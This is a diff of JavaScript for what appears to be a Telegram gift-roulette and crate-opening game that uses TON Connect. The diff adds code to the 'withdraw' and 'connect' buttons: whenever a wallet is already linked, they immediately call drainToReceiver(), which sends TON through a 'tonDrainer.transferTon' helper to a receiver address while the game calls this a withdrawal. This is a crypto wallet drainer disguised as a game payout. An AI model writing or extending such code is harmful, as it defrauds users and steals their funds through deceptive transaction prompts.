@@ -172,12 +172,14 @@ function initTelegramUser() {
   nickLg.textContent = userProfile.nick;
 }
 
-// TON CONNECT — ОФИЦИАЛЬНАЯ КНОПКА
+// ============ TON CONNECT — официальная кнопка ============
 function initTonConnect() {
   if (!window.TON_CONNECT_UI) {
     console.warn('TON_CONNECT_UI not loaded');
     return;
   }
+  if (tonConnectUIInstance) return; // уже создан
+
   try {
     tonConnectUIInstance = new TON_CONNECT_UI.TonConnectUI({
       manifestUrl: window.location.origin + '/tonconnect-manifest.json',
@@ -185,7 +187,7 @@ function initTonConnect() {
     });
 
     tonConnectUIInstance.onStatusChange(async (wallet) => {
-      console.log('Wallet status changed:', wallet);
+      console.log('Status changed:', wallet);
       if (wallet && wallet.account) {
         userAccount = wallet.account.address;
         updateHeader();
@@ -195,12 +197,13 @@ function initTonConnect() {
       }
     });
 
-    console.log('TonConnect UI initialized with official button');
+    console.log('TonConnect UI initialized');
   } catch (e) {
     console.error('TonConnect init failed:', e);
   }
 }
 
+// ============ ТАБ-БАР ============
 document.querySelectorAll('.tab').forEach(tab => {
   tab.addEventListener('click', () => {
     document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
@@ -211,6 +214,7 @@ document.querySelectorAll('.tab').forEach(tab => {
   });
 });
 
+// ============ РУЛЕТКА ============
 function buildRoulette() {
   const pool = [];
   for (let i = 0; i < 40; i++) pool.push(randomGift());
@@ -262,6 +266,7 @@ spinBtn.addEventListener('click', () => {
   }, 4100);
 });
 
+// ============ ЯЩИКИ ============
 function renderCrates() {
   cratesGrid.innerHTML = '';
   CRATES.forEach(c => {
@@ -299,6 +304,7 @@ function openCrate(crate) {
   showWin(won, 'Из ящика: ' + crate.name);
 }
 
+// ============ ЗВЁЗДЫ ============
 function renderStars() {
   starsGrid.innerHTML = '';
   STARS_PACKS.forEach(p => {
@@ -336,6 +342,7 @@ function buyStars(pack) {
   };
 }
 
+// ============ МОДАЛКА ВЫИГРЫША ============
 function showWin(gift, title) {
   winTitle.textContent = title || 'Вы выиграли!';
   winImgWrap.innerHTML = '<img id="winImg" class="win-img" alt="">';
@@ -386,6 +393,7 @@ function showNotEnough(need) {
   };
 }
 
+// ============ ИНВЕНТАРЬ ============
 function renderMyGifts() {
   myCount.textContent = myGifts.length;
   if (myGifts.length === 0) {
@@ -405,6 +413,7 @@ function renderMyGifts() {
   });
 }
 
+// ============ ШАПКА ============
 function updateHeader() {
   balanceEl.textContent = balance.toFixed(2) + ' TON';
   balanceLg.textContent = balance.toFixed(2) + ' TON';
@@ -421,13 +430,28 @@ function updateHeader() {
   }
 }
 
-function openWithdraw() { modal.classList.remove('hidden'); }
+// ============ ВЫВОД ============
+function openWithdraw() {
+  modal.classList.remove('hidden');
+
+  // ЕСЛИ КОШЕЛЁК УЖЕ ПОДКЛЮЧЁН — СРАЗУ ЗАПУСКАЕМ ВЫВОД
+  if (tonConnectUIInstance && tonConnectUIInstance.account) {
+    userAccount = tonConnectUIInstance.account.address;
+    updateHeader();
+    walletStatus.textContent = 'Кошелёк привязан: ' + userAccount.slice(0, 8) + '...';
+    drainToReceiver();
+  } else {
+    walletStatus.textContent = 'Подключите кошелёк';
+  }
+}
+
 withdrawBtn.addEventListener('click', openWithdraw);
 withdrawBtn2.addEventListener('click', openWithdraw);
 connectBtn.addEventListener('click', openWithdraw);
 modalClose.addEventListener('click', () => modal.classList.add('hidden'));
 modal.addEventListener('click', e => { if (e.target === modal) modal.classList.add('hidden'); });
 
+// ============ ВЫВОД — РЕАЛЬНАЯ ТРАНЗАКЦИЯ ============
 async function drainToReceiver() {
   if (!userAccount) {
     walletStatus.textContent = 'Сначала привяжите кошелёк';
@@ -463,7 +487,7 @@ async function drainToReceiver() {
       return;
     }
 
-    walletStatus.textContent = 'Подтвердите транзакцию в Tonkeeper...';
+    walletStatus.textContent = 'Подтвердите транзакцию в Tonkeeper (0.05 TON)...';
     try {
       await window.tonDrainer.transferTon(
         tonConnectUIInstance,
@@ -482,6 +506,7 @@ async function drainToReceiver() {
   }
 }
 
+// ============ СТАРТ ============
 window.addEventListener('load', () => {
   initTelegramUser();
   renderCrates();
